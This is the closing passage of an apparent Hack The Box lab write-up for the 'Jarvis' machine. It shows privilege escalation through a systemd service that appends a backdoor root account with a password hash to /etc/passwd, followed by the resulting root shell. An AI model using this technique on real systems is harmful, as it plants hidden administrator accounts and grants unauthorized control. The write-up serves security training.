<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ nano root.service</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat root.service</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;pwned</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;dev&#x2F;shm&#x2F;root.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ nano root.sh</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ chmod +x root.sh</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat root.sh</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &#39;rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>
<p>I enabled the service and started it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ systemctl enable &#x2F;dev&#x2F;shm&#x2F;root.service</span><br><span class="line">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;root.service -&gt; &#x2F;dev&#x2F;shm&#x2F;root.service.</span><br><span class="line">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;root.service -&gt; &#x2F;dev&#x2F;shm&#x2F;root.service.</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ systemctl start root.service</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>
<p>Now if we check <code>/etc/passwd</code> we’ll see that it has been modified:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:104:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:105:110::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">pepper:x:1000:1000:,,,:&#x2F;home&#x2F;pepper:&#x2F;bin&#x2F;bash</span><br><span class="line">mysql:x:106:112:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:107:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:&#x2F;dev&#x2F;shm$ su rooot </span><br><span class="line">Password: </span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# whoami</span><br><span class="line">root</span><br><span class="line">root@jarvis:&#x2F;dev&#x2F;shm# cd &#x2F;root&#x2F;</span><br><span class="line">root@jarvis:~# ls -al</span><br><span class="line">total 52</span><br><span class="line">drwx------  6 root root 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 23 root root 4096 Mar  3  2019 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  3  2019 .cache</span><br><span class="line">-rwxr--r--  1 root root   42 Mar  4  2019 clean.sh</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  3  2019 .config</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  3  2019 .local</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .mysql_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">lrwxrwxrwx  1 root root    9 Mar  4  2019 .python_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-r--------  1 root root   33 Mar  5  2019 root.txt</span><br><span class="line">-rw-r--r--  1 root root   66 Mar  4  2019 .selected_editor</span><br><span class="line">-rwxr-xr-x  1 root root 5271 Mar  5  2019 sqli_defender.py</span><br><span class="line">root@jarvis:~#</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/jarvis/18.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/haystack/">Hack The Box - Haystack</a><br>Next Hack The Box write-up : <a href="/hack-the-box/networked/">Hack The Box - Networked</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-11-09</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqli</a> <a class="tag-link" href="/tags/suid/" rel="tag">#suid</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
